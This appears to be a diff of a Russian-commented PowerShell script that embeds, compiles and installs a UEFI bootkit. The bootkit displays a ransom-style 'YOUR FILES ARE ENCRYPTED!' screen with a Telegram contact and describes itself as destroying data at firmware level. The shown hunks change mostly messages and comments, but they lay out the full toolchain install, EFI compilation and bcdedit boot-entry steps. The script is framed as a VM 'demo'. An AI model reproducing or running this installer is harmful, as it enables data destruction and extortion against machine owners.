@@ -1,6 +1,6 @@
 #Requires -RunAsAdministrator
 <#
-   
+
 #>
 
 $sourceCode = @'
@@ -10,8 +10,8 @@ $sourceCode = @'
 #include <Library/UefiRuntimeServicesTableLib.h>
 #include <Library/MemoryAllocationLib.h>
 #include <Library/BaseMemoryLib.h>
-#include <Protocol/SimpleFileSystem.h>
 #include <Protocol/BlockIo.h>
+#include <Guid/GlobalVariable.h>
 
 #define WAIT_BEFORE_BSOD   30
 #define CONTACT_TG         L"@unhook_proxy"
@@ -31,7 +31,7 @@ VOID ShowLockScreen(VOID)
     Print(L"  ╔═══════════════════════════════════════════════════════════╗\n");
     Print(L"  ║              YOUR FILES ARE ENCRYPTED!                    ║\n");
     Print(L"  ║   Telegram: %s                                            ║\n", CONTACT_TG);
-    Print(L"  ║   UEFI Bootkit DEMO - данные уничтожаются на уровне BIOS  ║\n");
+    Print(L"  ║   UEFI Bootkit DEMO — данные уничтожаются на уровне firmware║\n");
     Print(L"  ╚═══════════════════════════════════════════════════════════╝\n");
 }
 
@@ -132,11 +132,8 @@ EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *Syste
 '@
 
 # ============================================================
-# Исправленная функция установки Clang
-# ============================================================
 function Install-Clang {
     Write-Host "[+] Проверяем Clang..." -ForegroundColor Cyan
-    
     if (Get-Command clang -ErrorAction SilentlyContinue) { 
         Write-Host "[+] Clang уже работает" -ForegroundColor Green
         return 
@@ -145,7 +142,6 @@ function Install-Clang {
     Write-Host "[+] Устанавливаем LLVM..." -ForegroundColor Cyan
     winget install LLVM.LLVM -e --silent --accept-source-agreements --accept-package-agreements
 
-    # Добавляем путь
     $llvmPath = "C:\Program Files\LLVM\bin"
     if (Test-Path $llvmPath) {
         $env:Path += ";$llvmPath"
@@ -157,7 +153,7 @@ function Install-Clang {
     if (Get-Command clang -ErrorAction SilentlyContinue) {
         Write-Host "[+] Clang успешно установлен!" -ForegroundColor Green
     } else {
-        Write-Host "[-] Clang не найден. Перезапустите PowerShell." -ForegroundColor Yellow
+        Write-Host "[-] Перезапустите PowerShell от администратора" -ForegroundColor Yellow
     }
 }
 
@@ -189,7 +185,7 @@ function Compile-Efi {
     lld-link /NOLOGO /SUBSYSTEM:EFI_APPLICATION /ENTRY:UefiMain /MACHINE:X64 $obj /OUT:$efi
 
     if (Test-Path $efi) {
-        Write-Host "[+] Компиляция успешна: $efi" -ForegroundColor Green
+        Write-Host "[+] Компиляция успешна!" -ForegroundColor Green
         return $efi
     } else {
         Write-Host "[-] Ошибка компиляции!" -ForegroundColor Red
@@ -215,12 +211,9 @@ function Install-Bootkit {
     bcdedit /displayorder $guid /addfirst
 
     mountvol X: /D
-    Write-Host "[+] Bootkit успешно установлен!" -ForegroundColor Green
-    Write-Host "[!] Сделай снапшот и перезагрузи VM" -ForegroundColor Yellow
+    Write-Host "[+] Bootkit установлен! Перезагрузи VM после снапшота." -ForegroundColor Green
 }
 
-# ============================================================
-# MAIN
 # ============================================================
 Write-Host "=== BIOSware UEFI Demo для ПТУ ===" -ForegroundColor Magenta
 
@@ -230,4 +223,4 @@ $sourceCode | Out-File $tempC -Encoding utf8 -Force
 $efi = Compile-Efi -SourceFile $tempC
 Install-Bootkit -EfiFile $efi
 
-Write-Host "`nГотово! Перезагружай виртуальную машину." -ForegroundColor Green
+Write-Host "`nГотово!" -ForegroundColor Green
